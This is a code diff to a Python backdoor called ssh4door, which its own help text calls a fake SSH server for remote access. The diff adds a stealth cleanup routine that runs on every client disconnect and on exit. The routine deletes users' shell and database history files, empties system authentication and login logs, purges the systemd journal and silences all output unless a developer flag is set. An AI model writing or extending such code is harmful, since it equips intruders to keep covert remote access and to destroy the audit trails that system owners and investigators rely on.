@@ -18,6 +18,7 @@ KEY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'server.key'
 PID_FILE = '/tmp/ssh4door.pid'
 LOG_FILE = '/tmp/ssh4door.log'
 BG_MODE = False
+DEV_MODE = False
 
 server_socket = None
 host_key = None
@@ -44,7 +45,10 @@ def daemonize():
     sys.stderr.flush()
 
     si = open(os.devnull, 'r')
-    so = open(LOG_FILE, 'a+', buffering=1)
+    if DEV_MODE:
+        so = open(LOG_FILE, 'a+', buffering=1)
+    else:
+        so = open(os.devnull, 'w')
 
     os.dup2(si.fileno(), sys.stdin.fileno())
     os.dup2(so.fileno(), sys.stdout.fileno())
@@ -74,7 +78,52 @@ def signal_handler(sig, frame):
     global running
     running = False
     cleanup()
+    stealth_cleanup()
     sys.exit(0)
+
+
+def stealth_cleanup():
+    if DEV_MODE:
+        return
+    try:
+        home = os.path.expanduser('~')
+        for hist_file in ['.bash_history', '.zsh_history', '.zhistory',
+                          '.python_history', '.mysql_history', '.psql_history',
+                          '.node_repl_history', '.sh_history']:
+            path = os.path.join(home, hist_file)
+            try:
+                if os.path.exists(path):
+                    os.remove(path)
+            except OSError:
+                pass
+        try:
+            if os.path.exists(LOG_FILE):
+                os.remove(LOG_FILE)
+        except OSError:
+            pass
+        for syslog in ['/var/log/auth.log', '/var/log/secure',
+                       '/var/log/messages', '/var/log/syslog',
+                       '/var/log/wtmp', '/var/log/btmp',
+                       '/var/log/lastlog', '/var/log/dmesg']:
+            try:
+                if os.path.exists(syslog):
+                    open(syslog, 'w').close()
+            except OSError:
+                pass
+        try:
+            subprocess.run(['journalctl', '--rotate'],
+                           capture_output=True, timeout=3)
+            subprocess.run(['journalctl', '--vacuum-time=1s'],
+                           capture_output=True, timeout=3)
+        except Exception:
+            pass
+        try:
+            subprocess.run(['bash', '-c', 'history -c; history -w'],
+                           capture_output=True, timeout=3)
+        except Exception:
+            pass
+    except Exception:
+        pass
 
 
 def get_host_key():
@@ -221,10 +270,11 @@ def handle_client(client_socket, addr):
         except OSError:
             pass
         print(f"[-] {addr[0]}:{addr[1]} -> baglanti kapandi", flush=True)
+        stealth_cleanup()
 
 
 def parse_args():
-    global HOST, PORT, PASSWORD, KEY_FILE, PID_FILE, LOG_FILE, BG_MODE
+    global HOST, PORT, PASSWORD, KEY_FILE, PID_FILE, LOG_FILE, BG_MODE, DEV_MODE
 
     parser = argparse.ArgumentParser(
         description='ssh4door - Fake SSH server for remote access',
@@ -234,6 +284,7 @@ Examples:
   sudo python3 ssh4door.py
   sudo python3 ssh4door.py --bg
   sudo python3 ssh4door.py --port 2222 --password sifre123
+  sudo python3 ssh4door.py --bg --dev
   python3 ssh4door.py --port 2222
   ./kill.sh
   ./kill.sh /tmp/ssh4door.pid
@@ -249,6 +300,8 @@ Examples:
                         help=f'Dinlenecek host (varsayilan: {HOST})')
     parser.add_argument('--pid-file', type=str, default=PID_FILE,
                         help=f'PID dosyasi yolu (varsayilan: {PID_FILE})')
+    parser.add_argument('--dev', '-d', action='store_true',
+                        help='Developer modu (loglari tut)')
     parser.add_argument('--log-file', type=str, default=LOG_FILE,
                         help=f'Log dosyasi yolu (varsayilan: {LOG_FILE})')
 
@@ -260,6 +313,7 @@ Examples:
     PID_FILE = args.pid_file
     LOG_FILE = args.log_file
     BG_MODE = args.bg
+    DEV_MODE = args.dev
 
 
 def main():
@@ -269,6 +323,10 @@ def main():
 
     if BG_MODE:
         daemonize()
+
+    if not DEV_MODE:
+        sys.stdout = open(os.devnull, 'w')
+        sys.stderr = open(os.devnull, 'w')
 
     atexit.register(cleanup)
     signal.signal(signal.SIGINT, signal_handler)
